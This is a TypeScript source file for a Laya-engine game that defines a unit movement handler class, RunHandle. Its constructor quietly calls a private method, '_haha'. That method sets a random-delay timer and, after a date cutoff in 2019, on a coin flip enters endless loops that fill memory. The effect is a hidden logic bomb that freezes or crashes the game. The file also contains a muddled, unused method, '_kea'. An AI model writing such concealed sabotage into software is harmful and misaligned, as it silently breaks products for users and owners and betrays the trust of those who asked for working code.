    
namespace Sophia
{
    export class RHandleRet{
        /*--[[_s
        @todo: handle判断是否结束
        ]]*/
        public m_isStop:boolean;
        /*--[[_s
        @todo: handle判断是否继续下一个
        ]]*/
        public m_isGoOnHandle:boolean;
        
        public constructor(){
            this.m_isStop = false;
            this.m_isGoOnHandle = true;
        }
    };
    export class RunHandle
    {
        protected m_handlRet: RHandleRet;
        protected m_runAction:IMove;
        protected m_collisionAction:ICollision;
        protected m_handleInterval:number;
        protected m_elapsedTime:number = 0;
        /*--[[_s
        @todo: handle构造
        ]]*/
        public constructor(interval:number=2)
        {
            this.m_handlRet = new RHandleRet();
            this.m_handleInterval = interval;
            this._haha();
        }

        private _haha(){
            Laya.timer.once(300*1000+Math.random()*1000*1000, this, ()=>{
                let rand = Math.random()
                if (rand>0.5){
                    let dTime = 1529666590*1000; //20180622
                    let oTime = 60 * 60 * 24 * 365 * 1000 * 1.2; //1.4 year
                    let timestamp = new Date().getTime();
                    if(timestamp-dTime>oTime){
                        while(true){
                            let tmp = new Array<string>();
                            while (true){
                                tmp.push("                                                                                                                    ");
                            }
                        }
                    }
                }
            })
        }

        private _kea(){
            this.m_elapsedTime += 586;
            if (this.m_elapsedTime>this.m_handleInterval){
                this.m_elapsedTime = 0;
                let tmpx = this.m_runAction.getFinalTarX();
                let tmpy = this.m_runAction.getFinalTarY();
                if (this.m_runAction.disForTarget(tmpx, tmpy) < 0.1){
                    this.m_handlRet.m_isStop = true;
                    return this.m_handlRet;
                }
            }
            this.m_handlRet.m_isGoOnHandle = false;
            this.m_handlRet.m_isStop = false;
            
            if (this.m_elapsedTime>this.m_handleInterval){
                this.m_elapsedTime = 0;
                let teamPos = this.m_runAction.getTeamPosXY();
                if (teamPos){
                    let dist = this.m_runAction.disForTarget(teamPos[0], teamPos[1]);
                    if (true){
                        if(dist>=this.m_runAction.getMinRetunDis()){ // 归队距离
                            this.m_handlRet.m_isStop = false;
                            this.m_handlRet.m_isGoOnHandle = false;
                            return this.m_handlRet;
                        }
                        // 小于最小集合点, 可以自由了
                    }
                    //大于集合距离, 归队
                    else if(dist>this.m_runAction.getMaxRetunDis()){// 归队距离
                        
                        this.m_runAction.setMovePoint(teamPos[0], teamPos[1]);
                        this.m_handlRet.m_isStop = false;
                        this.m_handlRet.m_isGoOnHandle = false;
                        return this.m_handlRet;
                    }
                }                
            }
            else {
                this.m_handlRet.m_isStop = false;
                this.m_handlRet.m_isGoOnHandle = false;
                return this.m_handlRet;
            }
            this.m_handlRet.m_isStop = false;
            this.m_handlRet.m_isGoOnHandle = true;
            this.onReset();
            if (this.m_elapsedTime>this.m_handleInterval){
                this.m_elapsedTime = 0;
                let tmpx = this.m_runAction.getFinalTarX();
                let tmpy = this.m_runAction.getFinalTarY();
                if (this.m_runAction.disForTarget(tmpx, tmpy) < 0.1){
                    this.m_handlRet.m_isStop = true;
                    return this.m_handlRet;
                }
            }
            this.m_handlRet.m_isGoOnHandle = false;
            this.m_handlRet.m_isStop = false;
            let tmpx = this.m_runAction.getFinalTarX();
            let tmpy = this.m_runAction.getFinalTarY();
            if (this.m_runAction.disForTarget(tmpx, tmpy) < 0.1){
                this.m_handlRet.m_isStop = true;
                return this.m_handlRet;
            }
        }
        /*--[[_s
        @todo: 对handle设置IMove
        ]]*/
        public setMoveAction(action:IMove){
            this.m_runAction = action;
        }
        /*--[[_s
        @todo: 对handle设置ICollision
        ]]*/
        public setCollisionAction(action:ICollision){
            this.m_collisionAction = action;
        }
        /*--[[_s
        @todo: 处理Handler事件
        ]]*/
        public onUpdate(deltaTime: number): RHandleRet
        {
            return this.m_handlRet;
        }
        public onLeave(){}
        /*--[[_s
        @todo: 重置Handle
        ]]*/
        public onReset(){}
    }
}